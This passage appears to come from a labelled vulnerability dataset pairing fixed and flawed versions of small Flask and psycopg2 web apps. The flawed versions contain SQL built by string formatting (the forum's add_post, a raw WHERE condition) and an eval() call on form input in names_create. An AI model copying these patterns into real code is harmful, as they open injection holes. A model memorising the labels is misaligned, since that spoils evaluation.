format_as_pair_id_name(options):\n    formatted = [(0, None)]\n    for item in options:\n        formatted.append((item.id, item.name))\n    return formatted\n\ndef getPeopleOptions():\n    query = text(\n        \"SELECT Account.name AS name, Account.id AS id FROM Account\"\n        \" GROUP BY Account.name, Account.id\"\n        \" ORDER BY Account.name\"\n    )\n    return format_as_pair_id_name(db.engine.execute(query))\n\ndef getEditorOptions():\n    query = text(\n        \"SELECT Account.name AS name, Account.id AS id FROM Account\"\n        \" WHERE Account.editor = %s\" % (\"true\" if os.environ.get(\"HEROKU\") else \"1\") + \\\n        \" GROUP BY Account.name, Account.id\"\n        \" ORDER BY Account.name\"\n    )\n    return format_as_pair_id_name(db.engine.execute(query))\n\ndef getIssueOptions():\n    query = text(\n        \"SELECT id, name FROM Issue ORDER BY name\"\n    )\n    return format_as_pair_id_name(db.engine.execute(query))\n\n# DANGER DANGER, never call this without verifying that condition is not shady\ndef getArticlesWithCondition(condition=\"(0 = 0)\"):\n    return getArticlesAmountCondition(condition=condition)\n\n# Returns an array of [amount] articles where the condition [condition]\n#  is satisfied.\n# DANGER DANGER, never call this without verifying that condition is not shady\ndef getArticlesAmountCondition(amount=0, condition=\"(0=0)\"):\n    howmany = \"\"\n    order = \"\"\n    if amount > 0:\n        howmany = \" LIMIT %d\" % int(amount)\n    if amount != 1:\n        order = \" ORDER BY Issue.name\"\n    query = text(\n        \"SELECT\"\n        \" Article.id AS id,\"\n        \" Issue.name AS issue,\"\n        \" Article.writing_status AS writing_status,\"\n        \" Article.editing_status AS editing_status,\"\n        \" Article.ready AS ready,\"\n        \" Article.name AS name,\"\n        \" Article.writer AS writer_id,\"\n        \" Article.editor_in_charge AS editor_id,\"\n        \" Writer.name AS writer,\"\n        \" Editor.name AS editor_in_charge\"\n        \" FROM Article\"\n        \" LEFT JOIN Account Writer ON Article.writer = Writer.id\"\n        \" LEFT JOIN Account Editor ON Article.editor_in_charge = Editor.id\"\n        \" LEFT JOIN Issue ON Article.issue = Issue.id\"\n        \" WHERE %s\" % condition +\\\n        \" GROUP BY Article.id, Article.ready, Article.name, Issue.name, Writer.name, Editor.name\" + \\\n        howmany + order\n    )\n    return db.engine.execute(query)\n\ndef getArticleWithId(id):\n    if not isinstance(id, int):\n        return None\n\n    resultArray = getArticlesAmountCondition(amount=1, condition=\"Article.id = %d\" % id)\n    try:\n        return resultArray.first()\n    except:\n        return None\n        /n/n/napplication/issues/views.py/n/nfrom flask import render_template, request, redirect, url_for\nfrom flask_login import login_user, login_required, logout_user, current_user\n\nfrom application import app, db\nfrom application.articles.models import Article\nfrom application.articles.forms import ArticleForm\nfrom application.help import getEditorOptions, getIssueOptions, getPeopleOptions\nfrom application.issues.models import Issue\nfrom application.issues.forms import IssueForm\n\nfrom sqlalchemy.sql import text\n\n@app.route(\"/issues/\", methods=[\"GET\"])\ndef issues_index():\n    query = text(\n        \"SELECT issue.id, issue.name FROM issue ORDER BY issue.name\"\n    )\n    issues = db.engine.execute(query)\n    return render_template(\"/issues/list.html\", current_user=current_user, issues = issues)\n\n@app.route(\"/<issue>/articles/\", methods=[\"GET\"])\ndef articles_in_issue(issue):\n    try:\n        issueid = Issue.query.filter_by(name=issue).first().id\n    except:\n        return redirect(url_for(\"error404\"))\n\n    return render_template(\"articles/editor_view.html\", \n        planned_articles = Article.get_all_planned_articles(int(issueid)),\n        draft_articles = Article.get_all_draft_articles(int(issueid)),\n        written_articles = Article.get_all_written_articles(int(issueid)),\n        edited_articles = Article.get_all_edited_articles(int(issueid)),\n        finished_articles = Article.get_all_finished_articles(int(issueid)))\n\n@app.route(\"/<issue>/articles/new\", methods=[\"GET\"])\n@login_required\ndef articles_create_for_issue(issue):\n    try:\n        issueid = Issue.query.filter_by(name=issue).first().id\n    except:\n        return redirect(url_for(\"error404\"))\n    \n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = ArticleForm()\n    form.writer.choices = getPeopleOptions()\n    form.editorInCharge.choices = getEditorOptions()\n    form.issue.choices = getIssueOptions()\n    form.issue.data = issueid\n\n    return render_template(\"/articles/new.html\", form=form)\n\n@app.route(\"/issues/new/\", methods=[\"GET\", \"POST\"])\n@login_required\ndef issues_create():\n    if request.method == \"GET\":\n        form = IssueForm()\n        return render_template(\"/issues/new.html\", form=form)\n    \n    if not current_user.editor:\n        return redirect(url_for(\"error401\"))\n\n    form = IssueForm(request.form)\n\n    if not form.validate():\n        return render_template(\"issues/new.html\", form = form)\n    \n    issue = Issue(form.name.data)\n    db.session.add(issue)\n    db.session.commit()\n\n    return redirect(url_for(\"issues_index\"))\n\n@app.route(\"/<issue_id>/delete\", methods=[\"POST\"])\n@login_required\ndef issues_delete(issue_id):\n    if not current_user.is_admin:\n        return redirect(url_for(\"error401\"))\n\n    issue_to_delete = Issue.query.get(issue_id)\n    if not issue_to_delete:\n        return redirect(url_for(\"error404\"))\n\n    articles_in_issue = Article.query.filter_by(issue=issue_id)\n\n    # related articles are not distroyed but unassigned\n    for article in articles_in_issue:\n        article.set_issue(0)\n\n    db.session.delete(issue_to_delete)\n    db.session.commit()\n\n    return redirect(url_for(\"issues_index\"))\n\n/n/n/napplication/people/views.py/n/nfrom flask import redirect, render_template, request, url_for\nfrom flask_login import login_required, current_user\n\nfrom application import app, db\nfrom application.auth.models import User\nfrom application.people.models import Name\nfrom application.people.forms import NameForm\n\n@app.route(\"/people/\", methods=[\"GET\"])\ndef people_index():\n    return render_template(\"/people/list.html\", people = get_people())\n\n@app.route(\"/people/new/\")\n@login_required\ndef people_form():\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = NameForm()\n    return render_template(\"/people/new.html\", form = form)\n\n@app.route(\"/people/\", methods=[\"POST\"])\n@login_required\ndef people_create():\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = NameForm(request.form)\n\n    if not form.validate():\n        return render_template(\"people/new.html\", form = form)\n\n    u = User(form.name.data, \"\", \"\")\n    db.session().add(u)\n    db.session().commit()\n    u.add_name(form.name.data)\n\n    return redirect(url_for(\"people_index\"))\n\n@app.route(\"/people/<user_id>/edit\", methods=[\"GET\"])\n@login_required\ndef person_edit(user_id):\n    form = NameForm()\n    name = \"\"\n    username = \"\"\n    prsn = User.query.filter_by(id = user_id).first()\n\n    if prsn.username != \"\":\n        username = prsn.username\n\n    name = prsn.name\n\n    names = list(map(lambda name: {\"name\":name.name, \"id\":name.id}, prsn.names))\n    person = {\"id\": user_id, \"name\": name, \"username\": username, \"names\": names}\n\n    return render_template(\"/people/edit.html\", person = person, form = form)\n\n@app.route(\"/people/<user_id>/delete_name/<name_id>\", methods=[\"POST\"])\n@login_required\ndef delete_name(name_id, user_id):\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    name_to_delete = Name.query.filter_by(id = name_id).first()\n    db.session.delete(name_to_delete)\n    db.session.commit()\n    return redirect(url_for(\"person_edit\", user_id=user_id))\n\n@app.route(\"/people/<user_id>\", methods=[\"POST\"])\n@login_required\ndef names_create(user_id):\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = NameForm(request.form)\n\n    if not form.validate():\n        return render_template(\"/people/edit.html\", person=eval(request.form[\"person\"]), form = form)\n\n    n = Name(form.name.data, user_id)\n\n    db.session().add(n)\n    db.session().commit()\n\n    return redirect(url_for(\"person_edit\", user_id=user_id))\n\n@app.route(\"/people/<user_id>/\", methods=[\"GET\"])\ndef show_tasks(user_id):\n    user = User.query.get(int(user_id))\n    if not user:\n        return redirect(url_for(\"error404\"))\n    \n    name = user.name\n\n    articles_writing = user.get_articles_writing().fetchall()\n    articles_editing = user.get_articles_editing().fetchall()\n\n    return render_template(\"people/tasks.html\",\n        articles_writing = articles_writing,\n        articles_editing = articles_editing,\n        posessive_form = \"\" + name + \"'s\",\n        system_name = user.name,\n        person_is = name + \" is\")\n\ndef get_people():\n    people = []\n    ppl = User.query.all()\n    for person in ppl:\n        username = \"\"\n        name = person.name\n        if person.username:\n            username = person.username\n        names = Name.query.filter_by(user_id=person.id)\n        people.append({'id': person.id, 'username': username, 'name': name, 'names': names})\n    return people/n/n/n", "label": 0}, {"id": "3b85c99a373267bb85b1c9d88aab3f0c38494606", "code": "/application/issues/views.py/n/nfrom flask import render_template, request, redirect, url_for\nfrom flask_login import login_user, login_required, logout_user, current_user\n\nfrom application import app, db\nfrom application.help import getArticlesWithCondition\nfrom application.articles.models import Article\nfrom application.articles.forms import ArticleForm\nfrom application.help import getEditorOptions, getIssueOptions, getPeopleOptions\nfrom application.issues.models import Issue\nfrom application.issues.forms import IssueForm\n\nfrom sqlalchemy.sql import text\n\n@app.route(\"/issues/\", methods=[\"GET\"])\ndef issues_index():\n    query = text(\n        \"SELECT issue.id, issue.name FROM issue ORDER BY issue.name\"\n    )\n    issues = db.engine.execute(query)\n    return render_template(\"/issues/list.html\", current_user=current_user, issues = issues)\n\n@app.route(\"/<issue>/articles/\", methods=[\"GET\"])\ndef articles_in_issue(issue):\n    try:\n        issueid = Issue.query.filter_by(name=issue).first().id\n    except:\n        return redirect(url_for(\"error404\"))\n\n    return render_template(\"articles/editor_view.html\", \n        planned_articles = Article.get_all_planned_articles(int(issueid)),\n        draft_articles = Article.get_all_draft_articles(int(issueid)),\n        written_articles = Article.get_all_written_articles(int(issueid)),\n        edited_articles = Article.get_all_edited_articles(int(issueid)),\n        finished_articles = Article.get_all_finished_articles(int(issueid)))\n\n@app.route(\"/<issue>/articles/new\", methods=[\"GET\"])\n@login_required\ndef articles_create_for_issue(issue):\n    try:\n        issueid = Issue.query.filter_by(name=issue).first().id\n    except:\n        return redirect(url_for(\"error404\"))\n    \n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = ArticleForm()\n    form.writer.choices = getPeopleOptions()\n    form.editorInCharge.choices = getEditorOptions()\n    form.issue.choices = getIssueOptions()\n    form.issue.data = issueid\n\n    return render_template(\"/articles/new.html\", form=form)\n\n@app.route(\"/issues/new/\", methods=[\"GET\", \"POST\"])\n@login_required\ndef issues_create():\n    if request.method == \"GET\":\n        form = IssueForm()\n        return render_template(\"/issues/new.html\", form=form)\n    \n    if not current_user.editor:\n        return redirect(url_for(\"error401\"))\n\n    form = IssueForm(request.form)\n\n    if not form.validate():\n        return render_template(\"issues/new.html\", form = form)\n    \n    issue = Issue(form.name.data)\n    db.session.add(issue)\n    db.session.commit()\n\n    return redirect(url_for(\"issues_index\"))\n\n@app.route(\"/<issue_id>/delete\", methods=[\"POST\"])\n@login_required\ndef issues_delete(issue_id):\n    if not current_user.is_admin:\n        return redirect(url_for(\"error401\"))\n\n    issue_to_delete = Issue.query.get(issue_id)\n    if not issue_to_delete:\n        return redirect(url_for(\"error404\"))\n\n    articles_in_issue = Article.query.filter_by(issue=issue_id)\n\n    # related articles are not distroyed but unassigned\n    for article in articles_in_issue:\n        article.set_issue(0)\n\n    db.session.delete(issue_to_delete)\n    db.session.commit()\n\n    return redirect(url_for(\"issues_index\"))\n\n/n/n/n/application/people/views.py/n/nfrom flask import redirect, render_template, request, url_for\nfrom flask_login import login_required, current_user\n\nfrom application import app, db\nfrom application.auth.models import User\nfrom application.people.models import Name\nfrom application.people.forms import NameForm\n\n@app.route(\"/people/\", methods=[\"GET\"])\ndef people_index():\n    return render_template(\"/people/list.html\", people = get_people())\n\n@app.route(\"/people/new/\")\n@login_required\ndef people_form():\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = NameForm()\n    return render_template(\"/people/new.html\", form = form)\n\n@app.route(\"/people/\", methods=[\"POST\"])\n@login_required\ndef people_create():\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = NameForm(request.form)\n\n    if not form.validate():\n        return render_template(\"people/new.html\", form = form)\n\n    u = User(form.name.data, \"\", \"\")\n    db.session().add(u)\n    db.session().commit()\n    u.add_name(form.name.data)\n\n    return redirect(url_for(\"people_index\"))\n\n@app.route(\"/people/<user_id>/edit\", methods=[\"GET\"])\n@login_required\ndef person_edit(user_id):\n    form = NameForm()\n    name = \"\"\n    username = \"\"\n    prsn = User.query.filter_by(id = user_id).first()\n\n    if prsn.username != \"\":\n        username = prsn.username\n\n    name = prsn.name\n\n    names = list(map(lambda name: {\"name\":name.name, \"id\":name.id}, prsn.names))\n    person = {\"id\": user_id, \"name\": name, \"username\": username, \"names\": names}\n\n    return render_template(\"/people/edit.html\", person = person, form = form)\n\n@app.route(\"/people/<user_id>/delete_name/<name_id>\", methods=[\"POST\"])\n@login_required\ndef delete_name(name_id, user_id):\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    name_to_delete = Name.query.filter_by(id = name_id).first()\n    db.session.delete(name_to_delete)\n    db.session.commit()\n    return redirect(url_for(\"person_edit\", user_id=user_id))\n\n@app.route(\"/people/<user_id>\", methods=[\"POST\"])\n@login_required\ndef names_create(user_id):\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = NameForm(request.form)\n\n    if not form.validate():\n        return render_template(\"/people/edit.html\", person=eval(request.form[\"person\"]), form = form)\n\n    n = Name(form.name.data, user_id)\n\n    db.session().add(n)\n    db.session().commit()\n\n    return redirect(url_for(\"person_edit\", user_id=user_id))\n\n@app.route(\"/people/<user_id>/\", methods=[\"GET\"])\ndef show_tasks(user_id):\n    user = User.query.get(int(user_id))\n    if not user:\n        return redirect(url_for(\"error404\"))\n    \n    name = user.name\n\n    articles_writing = user.get_articles_writing()\n    articles_editing = user.get_articles_editing()\n\n    return render_template(\"people/tasks.html\",\n        articles_writing = articles_writing,\n        articles_editing = articles_editing,\n        posessive_form = \"\" + name + \"'s\",\n        system_name = user.name,\n        person_is = name + \" is\")\n\ndef get_people():\n    people = []\n    ppl = User.query.all()\n    for person in ppl:\n        username = \"\"\n        name = person.name\n        if person.username:\n            username = person.username\n        names = Name.query.filter_by(user_id=person.id)\n        people.append({'id': person.id, 'username': username, 'name': name, 'names': names})\n    return people/n/n/n", "label": 1}, {"id": "1a5d6ccf02bec303d454f87a6bb39baed30c205f", "code": "vagrant/forum/forumdb.py/n/n# \"Database code\" for the DB Forum.\n\nimport psycopg2\n\nDBNAME = \"forum\"\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"select content,time from posts order by time desc\")\n  return c.fetchall()\n  db.close()\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"insert into posts values(%s)\",(content,))\n  db.commit()\n  db.close()\n/n/n/n", "label": 0}, {"id": "1a5d6ccf02bec303d454f87a6bb39baed30c205f", "code": "/vagrant/forum/forumdb.py/n/n# \"Database code\" for the DB Forum.\n\nimport psycopg2\n\nDBNAME = \"forum\"\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"select content,time from posts order by time desc\")\n  return c.fetchall()\n  db.close()\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"insert into posts values('%s')\" % content)\n  db.commit()\n  db.close()\n/n/n/n", "label": 1}, {"id": "650b26c48bcb7824775ff269d4badf27666b611e", "code": "app/run.py/n/nimport json\nimport os\nimport mysql.connector\nfrom flask import Flask, render_template, url_for, redirect, request, session, jsonify, g\n\napp = Flask(__name__)\napp.config.from_object('config')\n\n\ndef get_db():\n    if not hasattr(g, 'db'):\n        g.db = mysql.connector.connect(user=os.getenv('SAMWISE_USERNAME'), password=os.getenv('SAMWISE_PASSWORD'),\n                                       host=os.getenv('SAMWISE_DB'))\n    return g.db\n\n\n@app.teardown_appcontext\ndef close_db(error):\n    if hasattr(g, 'db'):\n        g.db.close()\n\n\n@app.route(\"/\")\ndef index():\n    if 'netid' in session:\n        app.logger.debug('NetID: ' + session['netid'])\n        return redirect(url_for('calData', userid=session['netid']))\n    return render_template(\"index.html\")\n\n\n@app.route(\"/calendar\")\ndef calendar():\n    return render_template(\"calendar.html\")\n\n\n@app.route(\"/<userid>\")\ndef calData(userid):\n    if 'netid' in session:\n        app.logger.debug('User ID Data For ' + session['netid'])\n        return render_template(\"index.html\", netid=userid)\n    return redirect(url_for('index'))\n\n\n@app.route('/getUserExams/<netId>')\ndef getUserExams(netId):\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT courseId FROM samwisedb.User WHERE netId = %s', (netId,))\n    courses = [item[0] for item in cursor.fetchall()]\n    data = []\n    for courseId in courses:\n        cursor.execute('SELECT sections, time FROM samwisedb.Exam WHERE courseId = %s', (courseId,))\n        exam = [{'courseId': courseId, 'section': item[0], 'start': item[1]} for item in cursor.fetchall()]\n        data.append(exam)\n    return jsonify(data)\n\n\n@app.route('/getAllCourses')\ndef getAllCourses():\n    # Open the connection to database\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT courseId FROM samwisedb.Course ORDER BY courseId')\n    data = [item[0] for item in cursor.fetchall()]\n    return jsonify(data)\n\n\n@app.route('/getUserCourses/<netId>')\ndef getUserCourses(netId):\n    # Open the connection to database\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT courseId FROM samwisedb.User WHERE netId = %s', (netId,))\n    data = [item[0] for item in cursor.fetchall()]\n    return jsonify(data)\n\n\n@app.route('/addCourse/', methods=['POST'])\ndef addCourse():\n    data = request.get_json(force=True)\n    courseId = data['courseId']\n    user = data['user']\n    connection = get_db()\n    cursor = connection.cursor()\n    # TODO: Make sure course exists and use does not already have course\n    cursor.execute('INSERT INTO samwisedb.User(netId, courseId) VALUES (%s, %s)', (user, courseId))\n    connection.commit()\n    return jsonify([])\n\n\n@app.route('/removeCourse/', methods=['POST'])\ndef removeCourse():\n    data = request.get_json(force=True)\n    courseId = data['courseId']\n    userId = data['userId']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.User WHERE (userId, courseId) = (%s, %s)', (userId, courseId))\n    connection.commit()\n    return jsonify([])\n\n\n@app.route('/getProjects/<userId>')\ndef getProjects(userId):\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT * FROM samwisedb.Project WHERE user = %s', (userId,))\n    data = [{'projectId': item[1], 'projectName': item[2], 'date': item[3], 'courseId': item[4]} for item in\n            cursor.fetchall()]\n    for d in data:\n        cursor.execute('SELECT subtaskName FROM samwisedb.Subtask WHERE projectId = %s', (d['projectId'],))\n        subtasks = [item[0] for item in cursor.fetchall()]\n        d['subtasks'] = subtasks\n    return jsonify(data)\n\n\n@app.route('/removeProject/', methods=['POST'])\ndef removeProject():\n    data = request.get_json(force=True)\n    projectId = data['projectId']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.Project WHERE projectId = %s', (projectId,))\n    cursor.execute('DELETE FROM samwisedb.Subtask WHERE projectId = %s', (projectId,))\n    connection.commit()\n    return jsonify([])\n\n\n@app.route('/updateProject/', methods=['POST'])\ndef updateProject():\n    data = request.get_json(force=True)\n    projectId = data['projectid']\n    projectName = data['projectname']\n    dueDate = data['duedate']\n    courseId = data['course']\n\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('''\n       UPDATE samwisedb.Project\n       SET projectName=%s, dueDate=%s, courseId=%s\n       WHERE projectId=%s\n    ''', (projectName, dueDate, courseId, projectId))\n    connection.commit()\n    return jsonify(data)\n\n\n@app.route('/addProject/', methods=['POST'])\ndef addProject():\n    data = request.get_json(force=True)\n    userId = data['userId']\n    projectName = data['projectName']\n    courseId = data['courseId']\n    dueDate = data['dueDate']\n    subtasks = data['subtasks']\n\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('INSERT INTO samwisedb.Project(userId, projectName, dueDate, courseId) VALUES (%s, %s, %s, %s)',\n                   (userId, projectName, dueDate, courseId))\n    projectId = cursor.lastrowid\n    for subtask in subtasks:\n        cursor.execute('INSERT INTO samwisedb.Subtask(projectId, subtaskName) VALUES (%s, %s)', (projectId, subtask))\n    connection.commit()\n    return jsonify([projectId])\n\n\n@app.route('/getEvents/<userid>')\ndef getEvents(userid):\n    connection = get_db()\n\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT * FROM samwisedb.Event WHERE user = %s', userid)\n    data = [{\"eventName\": str(item[2]), \"startTime\": str(item[3]), \"endTime\": str(item[4]), \"tagId\": str(item[5])} for\n            item in cursor.fetchall()]\n\n    return jsonify(data)\n\n\n-\n\n\n@app.route('/removeEvent/', methods=['POST'])\ndef removeEvent():\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        eventId = data['eventId']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            cursor.execute('DELETE FROM samwisedb.Event WHERE eventId = %s', eventId)\n            connection.commit()\n        finally:\n            print (\"DONE\")\n\n    return jsonify([])\n\n\n@app.route('/addEvent/', methods=['POST'])\ndef addEvent():\n    event_id = -1\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        user = data['user']\n        eventName = data['eventName']\n        startTime = data['startTime']\n        endTime = data['endTime']\n        tagId = data['tagId']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            cursor.execute(\n                'INSERT INTO samwisedb.Event(user, eventName, startTime, endTime, tagId) values (%s, %s, %s, %s, %s)',\n                (user, eventName, startTime, endTime, tagId))\n            connection.commit()\n            event_id = cursor.lastrowid\n        finally:\n            print (\"DONE\")\n    return jsonify([event_id])\n\n\n@app.route('/updateEvent/', methods=['POST'])\ndef updateEvent():\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        eventId = data['eventId']\n        eventName = data['eventName']\n        startTime = data['startTime']\n        endTime = data['endTime']\n        tagId = data['tagId']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            cursor.execute(\n                'UPDATE samwisedb.Event SET eventName=%s, startTime=%s, endTime=%s, tagId=%s WHERE eventId=%s',\n                (eventName, startTime, endTime, tagId, eventId))\n            connection.commit()\n        finally:\n            print (\"DONE\")\n\n    return jsonify([])\n\n\n@app.route('/getTasks/<userId>', methods=['GET'])\ndef getTasks(userId):\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT * FROM samwisedb.Task WHERE user = %s', (userId,))\n    data = [{\n        'user': item[0],\n        'taskId': item[1],\n        'taskName': item[2],\n        'courseId': item[3],\n        'tag': item[4],\n        'dueDate': item[5],\n        'details': item[6]\n    } for item in cursor.fetchall()]\n\n    return jsonify(data)\n\n\n@app.route('/removeTask/', methods=['POST'])\ndef removeTask():\n    data = request.get_json(force=True)\n    taskId = data['taskid']\n\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.Task WHERE taskId = %s', taskId)\n    connection.commit()\n\n    return jsonify([])\n\n\n@app.route('/addTask/', methods=['POST'])\ndef addTaskCourse():\n    task_id = -1\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        userid = data['userid']\n        taskname = data['taskname']\n        course = data['course']\n        duedate = data['duedate']\n        details = data['details']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            cursor.execute('INSERT INTO samwisedb.Task(user, taskName, courseId, dueDate, details) values (%s, %s, %s, %s, %s)', (userid, taskname, course, duedate, details))\n            connection.commit()\n            task_id = cursor.lastrowid\n        finally:\n            print (\"DONE\")\n    return jsonify([task_id])\n\n\n@app.route('/updateTask/', methods=['POST'])\ndef updateTask():\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        taskid = data['taskid']\n        taskname = data['taskname']\n        details = data['details']\n        duedate = data['duedate']\n        course = data['course']\n\n        taskid = int(taskid)\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            cursor.execute(\"\"\"\n               UPDATE samwisedb.Task\n               SET taskName=%s, dueDate=%s, courseId=%s, details=%s\n               WHERE taskId=%s\n            \"\"\", (taskname, duedate, course, details, taskid))\n            connection.commit()\n        finally:\n            print (\"DONE\")\n\n    return jsonify([])\n\n\n@app.route('/exams/<course_id>')\ndef getExams(course_id):\n    # Open the connection to database\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT time FROM samwisedb.Exam WHERE courseId = %s', (course_id,))\n    data = [{'course_id': course_id, 'start': item[0]} for item in cursor.fetchall()]\n    return jsonify(data)\n\n\n@app.route('/courses/<courseId>')\ndef getClassInfo(courseId):\n    # Open the connection to database\n    connection = get_db()\n\n    cursor = connection.cursor()\n    cursor.execute('SELECT startTime FROM samwisedb.Course WHERE courseId = %s', courseId)\n    data = [{\"course\": courseId + \" Class\", \"start\": str(item[0])} for item in cursor.fetchall()]\n    return jsonify(data)\n\n\n@app.route('/addSubtask/', methods=['POST'])\ndef addSubtask():\n    data = request.get_json(force=True)\n    projectId = data['projectId']\n    subtask = data['subtask']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('INSERT INTO samwisedb.Subtask(projectId, subtask) VALUES (%s, %s)', (projectId, subtask))\n    subtaskId = cursor.lastrowid\n    connection.commit()\n    return jsonify([subtaskId])\n\n\n@app.route('/removeSubtask/', methods=['POST'])\ndef removeSubtask():\n    data = request.get_json(force=True)\n    subtaskId = data['subtaskId']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.Subtask WHERE subtaskId = %s', (subtaskId,))\n    connection.commit()\n    return jsonify([subtaskId])\n\n\n@app.route('/updateSubtask/', methods=['POST'])\ndef updateSubtask():\n    data = request.get_json(force=True)\n    subtaskId = data['subtaskId']\n    subtaskName = data['subtaskName']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('UPDATE samwisedb.Subtask SET subtaskName = %s WHERE subtaskId = %s', (subtaskName, subtaskId))\n    connection.commit()\n    return jsonify([subtaskName])\n\n\n@app.route('/getColor/<name>')\ndef getColor(name):\n    return app.config['COLORS'][hash(name) % len(app.config['COLORS'])]\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n/n/n/n", "label": 0}, {"id": "650b26c48bcb7824775ff269d4badf27666b611e", "code": "/app/run.py/n/nimport json\nimport os\nimport mysql.connector\nfrom flask import Flask, render_template, url_for, redirect, request, session, jsonify, g\n\napp = Flask(__name__)\napp.config.from_object('config')\n\ndef get_db():\n    if not hasattr(g, 'db'):\n        g.db = mysql.connector.connect(user=os.getenv('SAMWISE_USERNAME'), password=os.getenv('SAMWISE_PASSWORD'),\n                                       host=os.getenv('SAMWISE_DB'))\n    return g.db\n\n\n@app.teardown_appcontext\ndef close_db(error):\n    if hasattr(g, 'db'):\n        g.db.close()\n\n\n@app.route(\"/\")\ndef index():\n    if 'netid' in session:\n        app.logger.debug('NetID: ' + session['netid'])\n        return redirect(url_for('calData', userid=session['netid']))\n    return render_template(\"index.html\")\n\n\n@app.route(\"/calendar\")\ndef calendar():\n    return render_template(\"calendar.html\")\n\n\n@app.route(\"/<userid>\")\ndef calData(userid):\n    if 'netid' in session:\n        app.logger.debug('User ID Data For ' + session['netid'])\n        return render_template(\"index.html\", netid=userid)\n    return redirect(url_for('index'))\n\n\n@app.route('/getUserExams/<netId>')\ndef getUserExams(netId):\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT courseId FROM samwisedb.User WHERE netId = %s', (netId,))\n    courses = [item[0] for item in cursor.fetchall()]\n    data = []\n    for courseId in courses:\n        cursor.execute('SELECT sections, time FROM samwisedb.Exam WHERE courseId = %s', (courseId,))\n        exam = [{'courseId': courseId, 'section': item[0], 'start': item[1]} for item in cursor.fetchall()]\n        data.append(exam)\n    return jsonify(data)\n\n\n@app.route('/getAllCourses')\ndef getAllCourses():\n    # Open the connection to database\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT courseId FROM samwisedb.Course ORDER BY courseId')\n    data = [item[0] for item in cursor.fetchall()]\n    return jsonify(data)\n\n\n@app.route('/getUserCourses/<netId>')\ndef getUserCourses(netId):\n    # Open the connection to database\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT courseId FROM samwisedb.User WHERE netId = %s', (netId,))\n    data = [item[0] for item in cursor.fetchall()]\n    return jsonify(data)\n\n\n@app.route('/addCourse/', methods=['POST'])\ndef addCourse():\n    data = request.get_json(force=True)\n    courseId = data['courseId']\n    user = data['user']\n    connection = get_db()\n    cursor = connection.cursor()\n    # TODO: Make sure course exists and use does not already have course\n    cursor.execute('INSERT INTO samwisedb.User(netId, courseId) VALUES (%s, %s)', (user, courseId))\n    connection.commit()\n    return jsonify([])\n\n\n@app.route('/removeCourse/', methods=['POST'])\ndef removeCourse():\n    data = request.get_json(force=True)\n    courseId = data['courseId']\n    userId = data['userId']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.User WHERE (userId, courseId) = (%s, %s)', (userId, courseId))\n    connection.commit()\n    return jsonify([])\n\n\n@app.route('/getProjects/<userId>')\ndef getProjects(userId):\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT * FROM samwisedb.Project WHERE user = %s', (userId,))\n    data = [{'projectId': item[1], 'projectName': item[2], 'date': item[3], 'courseId': item[4]} for item in\n            cursor.fetchall()]\n    for d in data:\n        cursor.execute('SELECT subtaskName FROM samwisedb.Subtask WHERE projectId = %s', (d['projectId'],))\n        subtasks = [item[0] for item in cursor.fetchall()]\n        d['subtasks'] = subtasks\n    return jsonify(data)\n\n\n@app.route('/removeProject/', methods=['POST'])\ndef removeProject():\n    data = 